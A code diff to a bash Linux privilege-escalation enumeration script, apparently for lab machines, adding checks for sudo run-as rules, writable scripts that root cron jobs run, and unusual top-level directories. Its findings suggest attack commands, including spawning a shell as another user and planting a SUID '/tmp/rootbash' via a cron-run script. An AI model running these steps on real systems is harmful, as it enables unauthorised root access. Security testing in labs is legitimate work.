@@ -2256,7 +2256,38 @@ if [ -n "$SUDO_NP_CMDS" ]; then
     done <<< "$SUDO_NP_CMDS"
 fi
 
-# Report the NOPASSWD rules on their own; "= ALL" is already covered as CRIT.
+# Per-line parsing, because flattening to a command list throws away the
+# run-as target. "(scriptmanager : scriptmanager) NOPASSWD: ALL" grants every
+# command as that user and matches none of the checks below: the ALL=(ALL)
+# pattern wants a run-as of ALL, and the per-binary loop wants an absolute
+# path. It used to fall through all three and vanish.
+SUDO_RUNAS_USERS=""
+if [ -n "$SUDO_OUTPUT" ]; then
+    while IFS= read -r sline; do
+        case "$sline" in *NOPASSWD:*) ;; *) continue ;; esac
+        sru=$(printf '%s' "$sline" | sed -n 's/^[[:space:]]*(\([^)]*\)).*/\1/p' \
+            | sed 's/[[:space:]]*:.*//; s/^[[:space:]]*//; s/[[:space:]]*$//')
+        scmd=$(printf '%s' "$sline" | sed 's/.*NOPASSWD:[[:space:]]*//' \
+            | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
+        [ -n "$sru" ] || sru=root
+        [ "$scmd" = "ALL" ] || continue
+        case "$sru" in root|ALL) continue ;; esac
+        SUDO_RUNAS_USERS="${SUDO_RUNAS_USERS}${sru}
+"
+        add_finding HIGH "sudo: NOPASSWD ALL as $sru (lateral movement)" \
+            "$sline
+Every command as $sru, no password. Not root, but a different user whose
+files, keys, cron jobs and writable paths were out of reach until now.
+Note that 'sudo $sru' and 'su - $sru' both still ask for a password — you
+need -u to switch identity." \
+            "sudo -u $sru /bin/bash
+# then enumerate again as that user, the reachable surface has changed:
+sudo -u $sru $(readlink -f "$0" 2>/dev/null || echo "$0")"
+    done <<< "$SUDO_OUTPUT"
+fi
+
+# Remaining NOPASSWD rules as a list. A bare "ALL" here is either the root
+# case (already CRIT) or a run-as rule reported just above.
 if [ -n "$SUDO_NP_CMDS" ] && [ "$SUDO_NP_CMDS" != "ALL" ]; then
     add_finding HIGH "Sudo NOPASSWD rules (no password required)" \
         "$(printf '%s\n' "$SUDO_NP_CMDS" | cap_list 12)" \
@@ -2408,6 +2439,93 @@ if [ -n "$CRON_W" ]; then
         "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $TARGET
 # wait for the cron interval to fire, then:
 /tmp/rootbash -p"
+fi
+
+# ============== WRITABLE SCRIPT + ROOT-OWNED OUTPUT ================
+# The strongest cron signal there is, and it needs no readable crontab: a
+# script you can write sitting next to files root created minutes ago means
+# root is executing that script on a timer. Nothing else explains the pair.
+WSCRIPT_HITS=""
+if [ "$IS_ROOT" -eq 0 ]; then
+    SELF_PATH=$(readlink -f "$0" 2>/dev/null)
+    NOW_TS=$(date +%s 2>/dev/null || echo 0)
+
+    while IFS= read -r ws; do
+        [ -n "$ws" ] || continue
+        [ "$ws" = "$SELF_PATH" ] && continue
+        wsdir=$(dirname "$ws")
+
+        # root-owned regular files in the same directory, touched recently
+        ROOTOUT=$(timeout 10 find "$wsdir" -maxdepth 1 -type f -user root -mmin -120 \
+            2>/dev/null | head -5)
+        [ -n "$ROOTOUT" ] || continue
+
+        WS_DETAIL="writable script:  $ws
+owner/perms:      $(stat -c '%U:%G %A' "$ws" 2>/dev/null)
+root-owned files in $wsdir touched in the last 120 min:"
+        WS_FRESH=0
+        while IFS= read -r ro; do
+            [ -n "$ro" ] || continue
+            ro_mt=$(stat -c %Y "$ro" 2>/dev/null) || continue
+            ro_age=$((NOW_TS - ro_mt))
+            [ "$ro_age" -lt 0 ] && ro_age=0
+            # A single snapshot, no waiting: under 5 minutes old means the job
+            # is running right now and you will not wait long for your payload.
+            if [ "$ro_age" -lt 300 ]; then
+                WS_DETAIL="$WS_DETAIL
+  $ro  (modified ${ro_age}s ago — likely an active cron job)"
+                WS_FRESH=1
+            else
+                WS_DETAIL="$WS_DETAIL
+  $ro  (modified $((ro_age / 60)) min ago)"
+            fi
+        done <<< "$ROOTOUT"
+
+        [ "$WS_FRESH" -eq 1 ] && WS_DETAIL="$WS_DETAIL
+A file was written less than 5 minutes ago, so the interval is short."
+
+        WSCRIPT_HITS="${WSCRIPT_HITS}${ws}
+"
+        add_finding CRIT "Writable script with recent root-owned output in same dir" \
+            "$WS_DETAIL" \
+            "cat $ws
+ls -la $wsdir
+stat $(printf '%s\n' "$ROOTOUT" | head -1)
+# root runs $ws on a timer — whatever you put in it runs as root"
+    done <<< "$(timeout 30 find / -maxdepth 7 -type f -writable \
+        \( -name '*.py' -o -name '*.sh' -o -name '*.rb' -o -name '*.pl' -o -name '*.bash' \) \
+        -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/snap/*' \
+        2>/dev/null | head -40)"
+fi
+WSCRIPT_HITS=$(printf '%s' "$WSCRIPT_HITS" | grep -v '^$')
+
+# ================= ROOT'S PERSONAL CRONTAB ========================
+# Its mere existence is a finding when you hold a writable script: you cannot
+# read what it runs, but something it runs is a candidate.
+ROOT_CRONTAB=""
+for rc in /var/spool/cron/crontabs/root /var/spool/cron/root; do
+    [ -e "$rc" ] || continue
+    [ -r "$rc" ] && continue
+    ROOT_CRONTAB="$rc"
+    break
+done
+if [ -n "$ROOT_CRONTAB" ]; then
+    if [ -n "$WSCRIPT_HITS" ]; then
+        add_finding HIGH "Root's personal crontab exists but is unreadable" \
+            "$ROOT_CRONTAB
+Its contents are hidden, but these writable scripts are possible targets
+of whatever it runs:
+$(printf '%s\n' "$WSCRIPT_HITS" | cap_list 8)" \
+            "ls -la $ROOT_CRONTAB
+# confirm by watching for root-owned output next to the script:
+ls -la --time-style=full-iso $(dirname "$(printf '%s\n' "$WSCRIPT_HITS" | head -1)")"
+    else
+        add_finding INFO "Root's personal crontab exists but is unreadable" \
+            "$ROOT_CRONTAB
+Nothing writable found to pair it with yet. Re-check after gaining another
+user — this scan only sees what the current user can reach." \
+            "ls -la $ROOT_CRONTAB"
+    fi
 fi
 
 CRON_OTHER=""
@@ -2893,6 +3011,29 @@ for ndd in /opt /srv; do
 "
     done
 done
+# Directories at / that no distro creates. Someone added them by hand, which
+# on a lab box is usually the whole point. Only /opt and /srv were scanned
+# before, so a top-level /scripts owned by another user went unnoticed.
+STD_TOP=" bin boot dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var "
+while IFS= read -r td; do
+    [ -n "$td" ] || continue
+    tdname=${td#/}
+    case "$STD_TOP" in *" $tdname "*) continue ;; esac
+    td_owner=$(stat -c %U "$td" 2>/dev/null)
+    td_perms=$(stat -c %A "$td" 2>/dev/null)
+    # Interesting when you can write it, or when it is not root's.
+    td_why=""
+    [ -w "$td" ] && td_why="writable by $ME"
+    if [ -n "$td_owner" ] && [ "$td_owner" != root ]; then
+        td_why="${td_why:+$td_why, }owned by $td_owner"
+    fi
+    [ -n "$td_why" ] || continue
+    add_finding MED "Non-standard top-level directory: $td" \
+        "$td_perms  $(stat -c '%U:%G' "$td" 2>/dev/null)  ($td_why)
+Not part of any distro layout — someone put it here deliberately." \
+        "ls -la $td"
+done < <(timeout 10 find / -maxdepth 1 -mindepth 1 -type d 2>/dev/null)
+
 [ -n "$OPT_DIRS" ] && add_finding INFO "Non-default directories in /opt, /srv" \
     "$(printf '%s' "$OPT_DIRS" | sed 's/^  //' | cap_list 8)" \
     "ls -la /opt /srv 2>/dev/null"
@@ -3003,9 +3144,13 @@ while IFS='|' read -r n sev t64 d64 c64; do
 done < <(sort -t'|' -k1,1n -k3,3 "$FINDINGS")
 
 # ---------------- copy-paste block: commands only ----------------
-HAS_CMDS=$(while IFS='|' read -r n sev t64 d64 c64; do
-    [ -n "$(_unb64 "$c64")" ] && echo x
-done < <(sort -t'|' -k1,1n "$FINDINGS") | head -1)
+# Read straight from the file and stop at the first hit: piping into head -1
+# closed the pipe while the loop kept writing, which printed one "Broken pipe"
+# per remaining finding.
+HAS_CMDS=""
+while IFS='|' read -r n sev t64 d64 c64; do
+    if [ -n "$(_unb64 "$c64")" ]; then HAS_CMDS=x; break; fi
+done < "$FINDINGS"
 
 if [ -n "$HAS_CMDS" ]; then
     echo ""
